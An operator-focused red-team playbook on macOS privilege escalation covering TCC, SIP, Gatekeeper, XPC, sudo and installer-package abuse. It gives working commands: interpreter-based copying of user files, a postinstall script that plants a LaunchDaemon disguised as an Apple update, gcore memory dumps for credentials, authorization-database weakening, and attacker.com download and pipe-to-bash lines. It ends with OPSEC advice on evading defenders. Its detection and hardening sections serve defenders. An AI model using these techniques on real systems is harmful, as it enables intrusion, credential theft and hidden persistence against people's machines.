# macOS Privilege Escalation

> **MITRE ATT&CK Mapping**: T1548.004 (Elevated Execution with Prompt), T1068 (Exploitation for Privilege Escalation), T1574.004 (Dylib Hijacking), T1548.003 (Sudo and Sudo Caching)
> **Tactic**: Privilege Escalation (TA0004), Defense Evasion (TA0005)
> **Platforms**: macOS
> **Required Permissions**: User (initial), targeting Root, SIP bypass, or TCC bypass
> **OPSEC Risk**: Medium to Critical (many techniques leave forensic artifacts or trigger security notifications)

---

## Strategic Overview

Privilege escalation on macOS is the process of moving from a standard user context to root, or from a restricted execution context to one with broader system access. Modern macOS implements a layered security model consisting of User/Root privilege separation, System Integrity Protection (SIP), Transparency Consent and Control (TCC), Gatekeeper, Hardened Runtime, Library Validation, and the Endpoint Security (ES) framework. Effective privilege escalation requires understanding how these layers interact and where exploitable gaps exist.

Unlike Windows, where local admin is often the primary escalation target, macOS presents a more nuanced landscape. An operator may need root access for system-level persistence, SIP bypass for modifying protected system files, or TCC bypass for accessing camera, microphone, and protected user data. Each represents a different escalation objective with different techniques and risk profiles. Root access alone is insufficient if SIP prevents modification of system binaries, and SIP bypass is meaningless if the operator cannot first achieve root.

The 2025 macOS security landscape has seen significant research activity. Microsoft's Threat Intelligence team disclosed a SIP bypass (CVE-2024-44243) through kernel extension loading via storagekitd. Multiple TCC bypass vulnerabilities were published, including CVE-2025-43530 affecting VoiceOver and a series of application-level TCC bypasses documented by CERT Polska. CVE-2025-24204 revealed that Apple accidentally granted dangerous entitlements to the gcore utility. Apple introduced additional hardening in macOS Sequoia 15.x, but the complexity of the system continues to produce exploitable gaps. Operators must stay current with vulnerability disclosures, as the window between disclosure and patch deployment is the most operationally useful period.

---

## Technical Deep-Dive

### 1. TCC Bypass

TCC (Transparency, Consent, and Control) is Apple's privacy framework that controls application access to sensitive resources. Bypassing TCC is a form of privilege escalation from "standard user" to "user with unrestricted data access."

**TCC-Protected Resources:**

| Service | Description |
|---------|-------------|
| kTCCServiceSystemPolicyAllFiles | Full Disk Access (FDA) |
| kTCCServiceScreenCapture | Screen recording |
| kTCCServiceMicrophone | Microphone access |
| kTCCServiceCamera | Camera access |
| kTCCServiceAccessibility | Accessibility (UI control) |
| kTCCServiceAppleEvents | Apple Events / Automation |
| kTCCServiceSystemPolicyDesktopFolder | Desktop folder access |
| kTCCServiceSystemPolicyDocumentsFolder | Documents folder access |
| kTCCServiceSystemPolicyDownloadsFolder | Downloads folder access |

**TCC Database Locations:**
```bash
# User TCC (per-user permissions)
~/Library/Application Support/com.apple.TCC/TCC.db

# System TCC (system-wide, requires root + FDA/SIP bypass)
/Library/Application Support/com.apple.TCC/TCC.db

# Query current permissions
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client, service, auth_value FROM access WHERE auth_value=2;"
```

**TCC Bypass Techniques:**

**a) FDA Inheritance via Authorized Processes:**
```bash
# Processes inherit TCC from their parent
# If Terminal.app has Full Disk Access, all shell commands inherit it
# Find FDA-granted apps:
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"
```

**b) Application Version Downgrade:**
```bash
# Older app versions may lack Hardened Runtime or Library Validation
# Steps:
# 1. Identify target app with TCC grants
# 2. Find older version without Hardened Runtime
# 3. Check: codesign -d --flags /path/to/OldApp
#    - If "runtime" flag absent, DYLD_INSERT_LIBRARIES works
# 4. Inject: DYLD_INSERT_LIBRARIES=/path/to/payload.dylib /path/to/OldApp
# 5. Injected code inherits TCC permissions
```

**c) Bundled Interpreter Abuse:**
```bash
# Apps bundling interpreters allow arbitrary code with inherited TCC
# Example: GIMP bundles Python
/Applications/GIMP.app/Contents/MacOS/python -c "
import os, shutil
for f in os.listdir(os.path.expanduser('~/Desktop')):
    shutil.copy(os.path.join(os.path.expanduser('~/Desktop'), f), '/tmp/exfil/')
"

# Electron apps with Node.js
ELECTRON_RUN_AS_NODE=1 /Applications/App.app/Contents/MacOS/App -e "
const fs = require('fs');
console.log(fs.readdirSync(process.env.HOME + '/Documents'));
"
```

**d) Symlink/Mount Redirection:**
```bash
# Some TCC checks use paths rather than inodes
# CVE-2024-40855 exploited diskarbitrationd for mount-based TCC bypass
# Allows mounting into TCC-protected directories via directory traversal
```

**e) CVE-2025-43530 - VoiceOver TCC Bypass:**
```bash
# Exploits com.apple.scrod service (VoiceOver component)
# VoiceOver has special system permissions for accessibility
# Attack capabilities:
# - Execute arbitrary AppleScript commands
# - Send AppleEvents to any application (Finder, etc.)
# - Access protected files without TCC prompts
# - Capture microphone input silently
# No admin required, local user access sufficient
# Patched in macOS 26.2, PoC publicly available
```

### 2. SIP Bypass

System Integrity Protection (SIP, "rootless") restricts even root from modifying critical system files and processes. SIP bypass is the highest-value escalation target on macOS.

**SIP Status and Configuration:**
```bash
# Check SIP status
csrutil status
# Output: "System Integrity Protection status: enabled."

# SIP protections include:
# - Protection of system files (/System, /usr, /bin, /sbin)
# - Protection of system processes from code injection
# - Restriction on kernel extension loading
# - Protection of NVRAM variables
# - Restrictions on dtrace and debugging system processes

# SIP can only be legitimately disabled from Recovery Mode:
# csrutil disable (requires reboot into Recovery)
```

**CVE-2024-44243 - SIP Bypass via storagekitd (Disclosed January 2025):**

```bash
# Discovery: Microsoft Threat Intelligence
# Affected: macOS prior to Sequoia 15.2

# The storagekitd daemon manages disk state through Apple Storage Kit framework
# storagekitd has com.apple.rootless.install.inheritable entitlement
# This allows child processes to bypass SIP

# Attack chain:
# 1. storagekitd spawns child processes with inherited SIP-bypass entitlements
# 2. Third-party filesystem kexts loaded through storagekitd bypass SIP checks
# 3. Attacker-controlled kext runs with kernel privileges, unrestricted by SIP

# Impact:
# - Install rootkits in SIP-protected locations
# - Modify system files and binaries
# - Bypass Endpoint Security framework
# - Load arbitrary kernel extensions
# - Create undeletable persistent malware

# Patched in macOS Sequoia 15.2 (December 2024)
```

**CVE-2025-24099 - PackageKit SIP Bypass:**
```bash
# Part of a recurring series of PackageKit framework vulnerabilities
# The PackageKit installer framework has SIP-bypass entitlements
# Logic bugs allow attacker-controlled privileged file operations

# Researcher: Mickey Jin (jhftss) documented 9+ SIP bypasses in this component
# Historical CVEs: 2019-8561, 2020-9817, 2022-22583, 2022-26688,
#   2022-32913, 2023-42860, 2024-44243, 2025-24099

# This was a 0-day at conference disclosure, patched in macOS 15.3 (January 2025)
```

**CVE-2025-24204 - gcore Entitlement Exposure:**
```bash
# Apple mistakenly granted /usr/bin/gcore the com.apple.system-task-ports.read
# entitlement in macOS 15.0 (Sequoia)
# Allows reading the memory of ANY process, even with SIP enabled

# This enables:
# - Dumping securityd memory for Keychain master keys
# - Reading kernel_task memory
# - Extracting credentials from any running process
# - Bypassing SIP's process memory protection

# Check for the entitlement:
codesign -d --entitlements - /usr/bin/gcore 2>&1

# Affected: macOS 15.0 through 15.3
# Fixed in macOS 15.4
```

**SIP Bypass Pattern Recognition:**
```bash
# Common SIP bypass pattern:
# 1. Identify Apple-signed daemons with SIP-bypass entitlements
# 2. Find input validation or logic bugs in those daemons
# 3. Use the daemon as an oracle to perform SIP-protected operations

# Check entitlements on Apple daemons:
codesign -d --entitlements - /usr/libexec/storagekitd 2>&1 | grep -A5 rootless
codesign -d --entitlements - /usr/sbin/installer 2>&1 | grep -A5 rootless
codesign -d --entitlements - /usr/libexec/packagekitd 2>&1 | grep -A5 rootless
```

### 3. Authorization Database Manipulation

The macOS authorization database controls system-level privilege prompts. Modifying it can weaken authentication requirements.

```bash
# Read the authorization database
security authorizationdb read system.privilege.admin

# Important authorization rights:
# system.preferences            - System Preferences access
# system.privilege.admin         - Generic admin privilege
# system.install.apple-software  - Install Apple software
# system.install.admin-software  - Install admin software

# Weaken authentication: change mechanism from admin to session owner
security authorizationdb read system.privilege.admin > /tmp/admin_right.plist

# Modify the rule
/usr/libexec/PlistBuddy -c "Set :mechanisms:0 builtin:authenticate-session-owner" /tmp/admin_right.plist
/usr/libexec/PlistBuddy -c "Set :shared true" /tmp/admin_right.plist
/usr/libexec/PlistBuddy -c "Set :timeout 86400" /tmp/admin_right.plist

# Write back (requires admin)
security authorizationdb write system.privilege.admin < /tmp/admin_right.plist

# Now admin prompts accept any logged-in user password
# and cache authentication for 24 hours

# Reset to defaults:
security authorizationdb read system.privilege.admin > /dev/null  # Verify
# Use: security authorizationdb remove system.privilege.admin
# Then: authorizationdb will revert to default from authorization.plist
```

### 4. Dylib Hijacking for Privilege Escalation

When targeting privileged binaries, dylib hijacking can escalate privileges by executing code in a higher-privilege process context.

```bash
# Find vulnerable binaries with missing dylib references
for binary in /Applications/*/Contents/MacOS/*; do
    otool -l "$binary" 2>/dev/null | grep -A3 LC_LOAD_WEAK_DYLIB | grep name | while read _ name _; do
        [ ! -f "$name" ] && echo "MISSING WEAK DYLIB: $binary -> $name"
    done
done

# Find @rpath-based loads with writable search paths
for binary in /Applications/*/Contents/MacOS/*; do
    rpaths=$(otool -l "$binary" 2>/dev/null | grep -A2 LC_RPATH | grep path | awk '{print $2}')
    rpath_loads=$(otool -L "$binary" 2>/dev/null | grep @rpath | awk '{print $1}')
    for rp in $rpaths; do
        resolved="${rp/@executable_path/$(dirname $binary)}"
        [ -d "$resolved" ] && [ -w "$resolved" ] && echo "WRITABLE RPATH: $binary -> $resolved"
    done
done

# Target: Third-party privileged helper tools (often lack Hardened Runtime)
find /Library/PrivilegedHelperTools/ -type f -exec codesign -d --flags {} \; 2>&1
```

**SIP Considerations:**
```bash
# SIP protects system binaries from dylib injection
# DYLD_INSERT_LIBRARIES is stripped for:
# - Binaries in SIP-protected paths (/usr/bin, /System, etc.)
# - Binaries with Hardened Runtime
# - Binaries with Library Validation
# - setuid/setgid binaries

# Check Hardened Runtime:
codesign -d --flags /path/to/binary 2>&1
# Look for "runtime" in flags

# Check Library Validation:
codesign -d --entitlements - /path/to/binary 2>&1 | grep library-validation
```

### 5. Installer Package Abuse

macOS .pkg installer packages can run pre/post-install scripts as root, providing direct privilege escalation when a user installs a malicious package.

```bash
# Post-install script (runs as root during installation)
cat > /tmp/scripts/postinstall << 'EOF'
#!/bin/bash
# Create a LaunchDaemon for persistence (runs as root)
cat > /Library/LaunchDaemons/com.apple.systemupdate.plist << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Library/Application Support/.update/agent</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
PLIST
chmod 644 /Library/LaunchDaemons/com.apple.systemupdate.plist
exit 0
EOF
chmod 755 /tmp/scripts/postinstall

# Build the package
pkgbuild --root /tmp/pkg_root \
         --scripts /tmp/scripts \
         --identifier com.corporate.security-update \
         --version 1.0 \
         /tmp/SecurityUpdate.pkg

# Build a distribution package (more professional appearance)
productbuild --package /tmp/SecurityUpdate.pkg \
             --identifier com.corporate.security-update \
             /tmp/CorporateSecurityUpdate.pkg
```

**Analyzing Existing Packages for Vulnerabilities:**
```bash
# Expand a package to examine its contents
pkgutil --expand /path/to/package.pkg /tmp/expanded_pkg

# Check pre/post install scripts for insecure operations
cat /tmp/expanded_pkg/Scripts/preinstall
cat /tmp/expanded_pkg/Scripts/postinstall

# Look for:
# - Writing to world-writable locations
# - Using insecure temp files
# - Setting overly permissive file permissions
# - Downloading and executing remote content
# - Race conditions between check and use
```

### 6. XPC Validation Flaws

XPC is macOS's inter-process communication mechanism. Privileged helper tools running as root often use XPC to communicate with unprivileged applications. Improper validation of the connecting process is a common vulnerability class.

**Common XPC Validation Vulnerabilities:**

**a) No Client Validation (Most Common):**
```objectivec
// VULNERABLE: Accepts ANY connection without verification
- (BOOL)listener:(NSXPCListener *)listener
    shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
    newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
    newConnection.exportedObject = self;
    [newConnection resume];
    return YES;  // No validation performed
}
```

**b) PID-Based Validation (Vulnerable to Race Condition):**
```objectivec
// VULNERABLE: PID can be recycled between validation and message processing
pid_t pid = newConnection.processIdentifier;
// Race window: PID checked here, but by the time message is processed,
// a different (malicious) process may have reused the PID
```

**c) Proper Audit Token Validation (What defenders implement):**
```objectivec
// SECURE: Uses audit token for cryptographic identity verification
audit_token_t token = newConnection.auditToken;
SecCodeRef code = NULL;
NSDictionary *attrs = @{
    (__bridge NSString *)kSecGuestAttributeAudit:
        [NSData dataWithBytes:&token length:sizeof(token)]
};
OSStatus status = SecCodeCopyGuestWithAttributes(NULL,
    (__bridge CFDictionaryRef)attrs, kSecCSDefaultFlags, &code);
// Validate code signature, team ID, or code requirement
```

**Recent XPC Vulnerabilities (2025):**

```bash
# CVE-2025-65842 - Acustica Audio HelperTool XPC LPE
# The HelperTool performs no verification of the connecting process
# Any local process can connect and execute privileged operations

# CVE-2025-55076 - Plugin Alliance InstallationHelper XPC LPE
# Same class: no client validation in XPC listener delegate

# GOG Galaxy XPC service exploitation (IBM X-Force)
# Improper PID validation allows privilege escalation
```

**PID Reuse Attack:**
```bash
# Exploits the window between PID validation and message processing:
# 1. Start the legitimate application (passes PID check)
# 2. Rapidly kill it and fork to reuse the PID
# 3. Malicious process inherits the PID validation approval

# Requires precise timing and multiple attempts (race condition)
# posix_spawn used for PID targeting
```

**Finding Vulnerable XPC Services:**
```bash
# List privileged helper tools
ls -la /Library/PrivilegedHelperTools/

# Examine helper tool launchd plists
ls -la /Library/LaunchDaemons/ | grep -v com.apple

# Check helper entitlements and code signing
for helper in /Library/PrivilegedHelperTools/*; do
    echo "=== $helper ==="
    codesign -d --entitlements - "$helper" 2>&1
    # Look for exposed dangerous methods via class-dump or Hopper
done
```

### 7. Endpoint Security Framework Bypass

The Endpoint Security (ES) framework provides EDR vendors with deep system visibility. Bypassing ES is defense evasion that enables subsequent privilege escalation.

```bash
# Identify installed ES clients
systemextensionsctl list
# Look for "endpointSecurityExtension" category

# ES client bundles
/Library/SystemExtensions/

# Approaches to ES evasion:

# 1. Timing-based evasion
# ES events are asynchronous; rapid operations may evade notification
# Race condition between operation and ES event delivery

# 2. Entitled process abuse
# Some Apple-entitled processes may not generate ES events
# Operations via these processes may be invisible to EDR

# 3. ES client destabilization
# Flooding the ES subsystem with events can cause client issues
# Some ES clients may fail open under resource pressure

# 4. Network-level evasion
# ES monitors local operations but may not inspect all network traffic
# Use network-based techniques that bypass local ES monitoring

# 5. Pre-ES execution
# If code executes before ES client loads (early boot),
# it may operate without ES monitoring
```

### 8. Sudo Abuse

Sudo misconfigurations and caching behavior provide privilege escalation opportunities.

**Sudo Caching (T1548.003):**
```bash
# Check if sudo is cached (no password needed)
sudo -n true 2>/dev/null && echo "Cached" || echo "Password required"

# Default timestamp_timeout is 5 minutes on macOS
sudo grep timestamp_timeout /etc/sudoers /etc/sudoers.d/* 2>/dev/null

# Sudo timestamp files
/var/db/sudo/ts/<username>     # macOS modern location

# If sudo is cached, escalate immediately
sudo /bin/bash
sudo cp /path/to/implant /Library/LaunchDaemons/
sudo launchctl bootstrap system /Library/LaunchDaemons/com.malicious.plist
```

**TTY Tickets:**
```bash
# macOS Sierra+ has tty_tickets enabled by default
# Sudo auth is per-terminal, not per-user
# A cached sudo in Terminal.app does NOT apply to a background script

# Check tty_tickets status
sudo grep tty_tickets /etc/sudoers /etc/sudoers.d/* 2>/dev/null

# Historical: OSX.Proton malware disabled tty_tickets:
# echo 'Defaults !tty_tickets' >> /etc/sudoers
# This allowed sudo caching to apply across all TTYs
```

**Sudoers Misconfigurations:**
```bash
# Check for NOPASSWD entries
sudo grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/ 2>/dev/null

# Check for wildcard permissions
sudo grep -r '\*' /etc/sudoers /etc/sudoers.d/ 2>/dev/null

# Check group membership (admin group gets sudo on macOS by default)
id | grep -E "admin|sudo|wheel"

# Common misconfigurations:
# user ALL=(ALL) NOPASSWD: ALL                    -- No password for anything
# user ALL=(ALL) NOPASSWD: /usr/bin/python*        -- Wildcard in path
# %admin ALL=(ALL) ALL                             -- Default macOS (admin gets sudo)

# Exploit wildcard NOPASSWD:
# If: user ALL=(ALL) NOPASSWD: /usr/bin/python*
# Then: sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
```

**Sudo Plugin Abuse:**
```bash
# Sudo supports loadable plugins for auditing and policy
# Plugin configuration: /etc/sudo.conf

# A malicious sudo plugin can:
# - Log all sudo passwords in cleartext
# - Modify command execution
# - Bypass policy checks

# Default macOS: /etc/sudo.conf may not exist (built-in defaults)
cat /etc/sudo.conf 2>/dev/null
```

### 9. Local Exploits (2025 CVEs)

**CVE-2025-31222 - Apple OS Privilege Escalation (Critical):**
```bash
# Improper validation of user permissions during system calls
# Allows bypassing security checks and executing code with elevated privileges
# Classified as critical severity
# Published: May 2025
# Vector: Local privilege escalation via system call validation flaw
# Mitigation: Update to latest macOS version
```

**CVE-2025-24204 - gcore Process Memory Disclosure:**
```bash
# Apple accidentally granted /usr/bin/gcore com.apple.system-task-ports.read
# Allows reading the memory of ANY process, even with SIP enabled

# Exploitation:
sudo gcore -o /tmp/securityd_dump $(pgrep securityd)
sudo gcore -o /tmp/authd_dump $(pgrep authd)
strings /tmp/securityd_dump.core | grep -iE "password|credential|token"

# Affected: macOS 15.0 through 15.3
# Fixed in macOS 15.4
```

**CVE-2024-44243 - SIP Bypass via Kernel Extension Loading:**
```bash
# Microsoft disclosure: storagekitd daemon exploited for SIP bypass
# storagekitd has com.apple.rootless.install.inheritable entitlement
# Third-party filesystem kexts loaded through it bypass SIP
# Impact: Complete SIP bypass, rootkit installation, ES framework bypass
# Affected: macOS prior to Sequoia 15.2
# Fixed in macOS 15.2 (December 2024)
```

**CVE-2025-24099 - PackageKit SIP Bypass:**
```bash
# Variant of recurring PackageKit SIP bypass series
# 0-day at time of conference disclosure
# Patched in macOS 15.3 (January 2025)

# Historical pattern of PackageKit CVEs:
# 2019-8561, 2020-9817, 2022-22583, 2022-26688,
# 2022-32913, 2023-42860, 2024-44243, 2025-24099
# This is a recurring vulnerability class in the same component
```

### 10. Gatekeeper Bypass

Gatekeeper prevents execution of unsigned or untrusted code. Bypassing it enables execution of attacker payloads without security prompts.

**Gatekeeper Fundamentals:**
```bash
# Check Gatekeeper status
spctl --status
# "assessments enabled" means active

# Gatekeeper checks:
# 1. Code signature validity
# 2. Notarization status (stapled or online check)
# 3. Quarantine attribute (com.apple.quarantine)
# 4. Developer ID certificate validity

# Quarantine attribute management
xattr -l /path/to/downloaded/file  # Check for com.apple.quarantine
xattr -d com.apple.quarantine /path/to/file  # Remove quarantine
xattr -dr com.apple.quarantine /path/to/dir/  # Recursive removal
xattr -c /path/to/file  # Clear all extended attributes
```

**Quarantine Avoidance:**
```bash
# Methods that do NOT set quarantine attribute:

# curl/wget downloads
curl -o /tmp/payload https://attacker.com/payload

# Python downloads
python3 -c "import urllib.request; urllib.request.urlretrieve('https://attacker.com/payload', '/tmp/payload')"

# SSH/SCP transfers
scp attacker@host:/path/to/payload /tmp/payload

# Terminal-based file creation
# Payloads created by implants inherit no quarantine attribute

# piping directly to execution
curl -s https://attacker.com/script.sh | bash
```

**Historical Gatekeeper Bypass Patterns:**
```bash
# CVE-2022-42821: AppleDouble file format with restrictive ACLs
# Prevents Gatekeeper from reading quarantine attribute
chmod +a "everyone deny readextattr" /path/to/payload

# CVE-2022-32910: Crafted ZIP archives with quarantine propagation bugs
# Archive extraction fails to propagate quarantine to contained files

# CVE-2022-22616: ZIP archives with BoM parsing bugs
# Bill of Materials processing errors bypass quarantine checks

# Pattern: Archive format edge cases cause quarantine propagation failures
```

**Application Translocation:**
```bash
# App Translocation moves quarantined apps to random location before launch
# Prevents relative path attacks

# Bypass methods:
# 1. Remove quarantine before launch
# 2. Move the app (mv, not cp) from download location
# 3. Use xattr -d to strip quarantine attribute
```

---

## 2025 Techniques

### Endless Exploits: The PackageKit SIP Bypass Saga

Researcher Mickey Jin (jhftss) documented a comprehensive history of PackageKit-related SIP bypass vulnerabilities spanning 2019-2025:

```
PackageKit processes have SIP-bypass entitlements (needed for installing into /System)
Logic bugs in package validation allow attacker-controlled operations
Apple patches specific bugs but the architectural pattern persists
New variants continue to appear in this same component

Timeline:
- 2019: CVE-2019-8561 (First PackageKit SIP bypass)
- 2020: CVE-2020-9817
- 2022: CVE-2022-22583, CVE-2022-26688, CVE-2022-32913
- 2023: CVE-2023-42860
- 2024: CVE-2024-44243 (storagekitd variant)
- 2025: CVE-2025-24099 (0-day at disclosure)

Operator Takeaway: Monitor PackageKit and installer-related CVEs as this
is a historically reliable source of SIP bypass vulnerabilities
```

### CVE-2025-43530 - VoiceOver TCC Bypass

```bash
# Exploits com.apple.scrod service (VoiceOver component)
# VoiceOver has special system permissions for accessibility
# These permissions grant broad access to user data

# Attack capabilities:
# - Execute arbitrary AppleScript commands
# - Send AppleEvents to any application (Finder, etc.)
# - Access protected files without TCC prompts
# - Capture microphone input silently

# Requirements: Local access only, no admin needed
# VoiceOver does NOT need to be enabled by user
# PoC available since publication
# Fixed in macOS 26.2

# Enterprise impact:
# Shared devices or multi-user Macs are particularly vulnerable
# Initial access via phishing + this CVE = full data access
```

### CERT Polska TCC Bypass Research (August 2025)

```bash
# Systematic analysis of application-level TCC bypasses
# Six applications found vulnerable to TCC permission inheritance

# Common pattern:
# 1. Application granted TCC permissions by user (legitimate use)
# 2. Application bundles interpreter (Python, Node.js, etc.)
# 3. Bundled interpreter inherits application's TCC grants
# 4. Attacker invokes interpreter with arbitrary code
# 5. Code runs with application's full TCC permissions

# CVE-2025-15523 (Inkscape, published January 2026) continues this pattern
# Inkscape's bundled Python inherits its TCC permissions
```

### XPC Privilege Escalation Trend (2025)

```bash
# Multiple XPC privilege escalation CVEs published in 2025:
# CVE-2025-65842 - Acustica Audio HelperTool
# CVE-2025-55076 - Plugin Alliance InstallationHelper
# Plus many more in third-party applications

# Audit methodology for finding new instances:
# 1. Enumerate helpers: ls /Library/PrivilegedHelperTools/
# 2. Check code signing: codesign -d --flags <helper>
# 3. Reverse engineer: Look for NSXPCListener delegate implementation
# 4. Check for audit token validation vs PID-only validation
# 5. Identify exposed methods performing privileged operations
# 6. Test with custom XPC client connecting to the Mach service

# Tools for analysis:
# class-dump /Library/PrivilegedHelperTools/com.example.helper
# Hopper Disassembler for binary analysis
# Frida for runtime inspection of XPC message handling
```

---

## Detection & Defense

### Log Sources

```bash
# Privilege escalation attempts
log show --predicate 'process == "sudo"' --last 1h
log show --predicate 'process == "su"' --last 1h
log show --predicate 'subsystem == "com.apple.Authorization"' --last 1h

# SIP-related events
log show --predicate 'subsystem == "com.apple.sandbox"' --last 1h
log show --predicate 'eventMessage CONTAINS "rootless"' --last 1h

# Gatekeeper events
log show --predicate 'subsystem == "com.apple.syspolicy"' --last 1h

# TCC events
log show --predicate 'subsystem == "com.apple.TCC"' --last 1h

# XPC service connections
log show --predicate 'subsystem == "com.apple.xpc"' --last 1h

# Package installation
log show --predicate 'process == "installer" OR process == "packagekitd"' --last 1h
```

### Detection Strategies

| Technique | Detection Method |
|-----------|-----------------|
| TCC Bypass | Monitor TCC.db modifications, unusual TCC queries |
| SIP Bypass | csrutil status monitoring, file integrity on /System |
| Auth DB Manipulation | Monitor `security authorizationdb write` commands |
| Dylib Hijacking | Code signature validation, DYLD_ env monitoring |
| Package Abuse | Monitor installer process, verify package signatures |
| XPC Exploitation | Monitor connections to privileged helpers |
| ES Bypass | Monitor ES client health, detect event flooding |
| Sudo Abuse | Monitor /etc/sudoers changes, sudo timestamp access |
| Kernel Exploits | Monitor kernel panics, unexpected kext loads |
| Gatekeeper Bypass | Monitor quarantine removal, unsigned execution |

### Hardening Recommendations

```bash
# Verify SIP is enabled
csrutil status

# Enable FileVault
sudo fdesetup status
sudo fdesetup enable

# Review sudo configuration
sudo visudo  # Check for NOPASSWD, wildcards
sudo cat /etc/sudoers.d/*

# Audit privileged helper tools
for h in /Library/PrivilegedHelperTools/*; do
    echo "=== $h ==="
    codesign -dvvv "$h" 2>&1 | grep -E "Identifier|TeamIdentifier|Runtime"
done

# Review TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db "SELECT * FROM access;"

# Monitor authorization database
security authorizationdb read system.privilege.admin

# Keep macOS updated
softwareupdate --list
softwareupdate --install -a

# Enable Lockdown Mode for high-risk targets
# System Settings > Privacy & Security > Lockdown Mode
```

---

## OPSEC Considerations

### General Guidance

1. **Escalation Timing:** Perform privilege escalation during active user sessions when authentication prompts are expected. Random sudo prompts at unusual hours are suspicious.

2. **CVE Selection:** Choose well-tested exploits with known reliability. Failed exploitation generates crashes, kernel panics, and log entries that alert defenders.

3. **Staged Escalation:** Prefer escalating through multiple small steps rather than a single large jump. User to Admin to Root is less conspicuous than User to Kernel.

4. **Log Awareness:** macOS unified logging captures extensive telemetry. Know which logs your technique generates and plan for log management post-escalation.

5. **SIP Bypass Caution:** Only attempt SIP bypass when the exploit is well-tested, the target system version is confirmed vulnerable, the operational need justifies the risk, and a rollback plan exists.

6. **TCC Bypass Selection:** Application-level TCC bypasses (bundled interpreter abuse) are lower risk than system-level bypasses. Prefer the former when possible.

7. **XPC Exploitation:** Test XPC exploits extensively in lab environments matching the target macOS and application versions. XPC service behavior can change between minor application updates.

8. **Sudo Considerations:** Modifying `/etc/sudoers` is highly detectable. Prefer exploiting existing sudo caching or NOPASSWD configurations over making changes.

9. **Cleanup:** After escalation, ensure the escalation vector is not left in a modified state that could be discovered during routine security audits. Restore authorization database changes, remove test artifacts.

10. **Gatekeeper:** Prefer quarantine-free delivery methods (curl, SCP, in-memory execution) over trying to bypass Gatekeeper on already-quarantined files.

---

## Cross-References

- [macOS Persistence Mechanisms](../04-persistence/macos-persistence.md) - Installing persistent access after privilege escalation
- [macOS Credential Access](../07-credential-access/macos-credential-access.md) - Credential extraction techniques that benefit from escalated privileges

---

## References

- MITRE ATT&CK T1548.004 - Elevated Execution with Prompt - https://attack.mitre.org/techniques/T1548/004/
- MITRE ATT&CK T1068 - Exploitation for Privilege Escalation - https://attack.mitre.org/techniques/T1068/
- MITRE ATT&CK T1574.004 - Dylib Hijacking - https://attack.mitre.org/techniques/T1574/004/
- MITRE ATT&CK T1548.003 - Sudo and Sudo Caching - https://attack.mitre.org/techniques/T1548/003/
- Microsoft Security Blog - CVE-2024-44243 SIP Bypass (January 2025) - https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/
- jhftss - Endless Exploits: The Saga of a macOS Vulnerability Struck Nine Times - https://jhftss.github.io/Endless-Exploits/
- hackyboiz - macOS SIP Bypass Research (2025) - https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/
- hackyboiz - macOS TCC Bypass Research (2025) - https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_en/
- CVE-2025-43530 - TCC Bypass via VoiceOver - https://cyberpress.org/new-macos-tcc-bypass-vulnerability/
- CVE-2025-24204 - gcore Process Memory Disclosure - https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/
- CVE-2025-31222 - Apple OS Privilege Escalation - https://dailycve.com/apple-os-privilege-escalation-vulnerability-cve-2025-31222-critical/
- CVE-2025-65842 - Acustica Audio XPC LPE - https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/
- CVE-2025-55076 - Plugin Alliance XPC LPE - https://almightysec.com/plugin-alliance-helpertool-xpc-service-local-privilege-escalation/
- CERT Polska - TCC Bypass in Six macOS Applications (August 2025) - https://cert.pl/en/posts/2025/08/tcc-bypass/
- CERT Polska - CVE-2025-15523 Inkscape TCC Bypass (January 2026) - https://cert.pl/en/posts/2026/01/CVE-2025-15523/
- IBM X-Force - GOG Galaxy XPC Exploitation - https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos
- L3Harris - Breaking SIP with Apple-signed Packages - https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages
- Red Canary - Gatekeeping in macOS - https://redcanary.com/blog/threat-detection/gatekeeper/
- Red Canary - Gatekeeper Bypass Detection - https://redcanary.com/threat-detection-report/techniques/gatekeeper-bypass/
- SentinelOne - Privilege Escalation: macOS Malware and The Path to Root - https://www.sentinelone.com/labs/privilege-escalation-macos-malware-path-to-root/
- HackTricks - macOS Security and Privilege Escalation - https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/index.html
- HackTricks - macOS XPC Connection Process Check - https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-connecting-process-check/
- HackTricks - macOS PID Reuse - https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-connecting-process-check/macos-pid-reuse.html
- tonghuaroot - Awesome macOS Red Teaming - https://github.com/tonghuaroot/Awesome-macOS-Red-Teaming
- Apple Insider - macOS SIP Bypass Fix (January 2025) - https://appleinsider.com/articles/25/01/15/macos-flaw-that-allowed-attackers-to-bypass-core-system-protections-is-now-fixed
- eSecurity Planet - macOS TCC Bypass CVE-2025-43530 - https://www.esecurityplanet.com/threats/macos-flaw-enables-silent-bypass-of-apple-privacy-controls/
